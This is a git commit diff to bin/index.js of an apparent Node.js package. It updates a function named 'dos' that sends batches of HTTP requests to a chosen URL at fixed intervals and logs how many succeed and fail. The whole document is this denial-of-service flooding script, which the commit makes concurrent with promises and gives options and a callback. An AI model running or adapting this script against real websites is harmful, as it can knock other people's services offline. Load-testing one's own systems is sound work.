6e1eb0243164b7f3115323571f1109a3c596c5bb
berlovesumwah <166808321+weberbers201938@users.noreply.github.com>
2024-05-20 23:47:54 +0800

    Update index.js

--- bin/index.js
+++ bin/index.js
@@ -1,25 +1,39 @@
-const req = require('request');
+const request = require('request');
 
-const dos = (url, qty, ms) => {
-    let err = 0, ok = 0;
+const dos = (url, qty, ms, options = {}, callback) => {
     let counter = 1;
 
-    setInterval(() => {
+    const sendRequests = async () => {
+        let err = 0, ok = 0;
+        const startTime = new Date();
 
-        for (let i = 0; i < qty; i++) {
-            req(url, error => {
-                if (error) {
-                    err++;
-                } else {
-                    ok++;
-                }
+        const promises = Array.from({ length: qty }, () => {
+            return new Promise((resolve) => {
+                request({ url, ...options }, (error, response) => {
+                    if (error) {
+                        err++;
+                        console.error(`Error: ${error.message}`);
+                    } else {
+                        ok++;
+                    }
+                    resolve();
+                });
             });
+        });
+
+        await Promise.all(promises);
+
+        const endTime = new Date();
+        console.log(`[${startTime.toISOString()} - ${endTime.toISOString()}] Batch ${counter}: ${url} OK: ${ok} ERR: ${err}`);
+
+        if (callback) {
+            callback(ok, err);
         }
-            console.log(`${counter}: ${url} ${ok} ${err}`);
-            counter++;
-            err = ok = 0;
-    }, ms);
+
+        counter++;
+    };
+
+    setInterval(sendRequests, ms);
 };
 
 module.exports = dos;
-              
